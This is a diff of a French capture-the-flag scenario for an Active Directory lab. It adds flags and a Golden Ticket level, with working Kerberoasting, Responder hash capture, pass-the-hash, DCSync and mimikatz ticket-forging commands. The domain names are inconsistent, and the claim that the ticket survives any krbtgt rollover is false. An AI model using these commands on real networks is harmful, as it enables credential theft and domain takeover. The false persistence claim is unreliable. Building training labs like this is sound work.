@@ -210,6 +210,24 @@ GetNPUsers -request -outputfile "hashes.txt" -format "john" -userfile "list_recu
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
+
+Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :
+
+Flag (à soumettre) :
+
+Comment le récupérer :
+
+Après avoir lancé la commande Kerberoasting :
+
+GetUserSPNs.py casino.bellagio.com -request -outputfile spn_hashes.txt -dc-ip 192.168.1.10
+john --wordlist=/usr/share/wordlists/rockyou.txt spn_hashes.txt
+John affiche en clair quelque chose comme :
+
+ServiceAccount-Bellagio:SvcAppPass!23
+Vous extrayez la partie SvcAppPass!23, l’encadrez par FLAG{…} et vous soumettez :
+
+FLAG{SvcAppPass!23}
+
 Message réussite niveau :
 
 
@@ -302,6 +320,21 @@ psexec.py -hashes :`cat captured_hash.txt` \
 
 net localgroup Administrators pentester /add
 
+
+Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :
+
+Flag (à soumettre) :
+
+FLAG{F1E2D3C4B5A6978877665544332211FF}
+Comment le récupérer :
+
+Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :
+
+[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
+      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
+      
+Flag ici F1E2D3C4B5A6978877665544332211FF
+
 Message réussite niveau :
 Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...
 
@@ -356,6 +389,19 @@ Depuis votre session psexec sur ITServer-Mirage
 net group "Domain Admins" BackupOperator-Mirage /domain
 
 
+Voici une proposition de flag pour le Level 5, que tu pourras intégrer directement dans ton scénario :
+
+Flag (à soumettre) :
+FLAG{BackupOperator-Mirage}
+
+Comment l’extraire ?
+
+Les joueurs importent les ZIP BloodHound et lancent la requête “Shortest Path to Domain Admins”.
+
+Ils repèrent qu’un compte BackupOperator-Mirage possède un droit “AddMember” sur le groupe Domain Admins du domaine casino.bellagio.com via le trust.
+
+Ils soumettent alors exactement le sAMAccountName trouvé, encadré par FLAG{…}, soit FLAG{BackupOperator-Mirage}.
+
 Message réussite : 
 
 Vous maîtrisez à présent les deux domaines. Le déblocage du chemin privilégié via BloodHound a permis de prendre le contrôle des groupes Domain Admins et Enterprise Admins, assurant le succès ultime du casse numérique avant l’attaque physique sur le Strip.
@@ -364,7 +410,49 @@ Vous maîtrisez à présent les deux domaines. Le déblocage du chemin privilég
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
-Level 6:
+
+Level 6 : Implantation d’une porte dérobée Kerberos sur les deux windows server  (Golden Ticket)
+
+Script pour histoire du niveau :
+
+Vous détenez déjà un accès Domain Admin sur le domaine casino..com, et votre session pentester peut exécuter n’importe quelle action sur le contrôleur de domaine. Danny Ocean veut maintenant assurer une persistance totale, même si Terry Benedict change les mots de passe ou réinitialise les comptes : il vous faut une porte dérobée Kerberos indétectable, un Golden Ticket, qui vous permettra de générer des tickets Kerberos valides pour n’importe quel compte, à vie.
+
+Tandis que l’équipe physique s’apprête à passer à l’assaut des coffres, c’est vous qui préparez la sortie : extraire le hash du compte krbtgt, forger un ticket doré, et l’injecter dans votre session afin d’être toujours authentifié comme un administrateur, quel que soit l’état du domaine.
+
+Attaque: 
+
+Ouvrir une session SYSTEM sur le DC :
+
+psexec.py -no-pass pentester@DC-Mirage.casino.mirage.com cmd.exe
+
+Extraire le hash du compte krbtgt via DCSync :
+
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /user:krbtgt
+
+Générer le Golden Ticket :
+
+mimikatz # kerberos::golden /domain:casino.bellagio.com \
+                         /user:Administrator \
+                         /sid:S-1-5-21-XXXXXXXXXX \
+                         /krbtgt:<KRBTGT_NTLM_HASH> \
+                         /id:500 \
+                         /groups:512,516,520 \
+                         /startoffset:0 /endin:31536000 \
+                         /ticket:golden_Administrator.krb
+
+Injecter le ticket dans votre session Kerberos :
+
+mimikatz # kerberos::ptt golden_Administrator.krb
+
+Vérifier la validité du ticket : 
+
+klist
+
+Exemple de Clé CTF a trouvé avec NTLM  a faire sur les 2 AD: 3f5d2c7a9e8b4f1a6c3e2b7d4a1f9e0b
+
+Message réussite : vous disposez d’une porte dérobée Kerberos permanente sur le domaine Mirage. Quel que soit le rollover du compte krbtgt ou les changements de mot de passe, vous pourrez toujours cultiver de nouveaux tickets pour n’importe quel utilisateur — la persistance ultime avant de passer aux niveaux suivants.
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
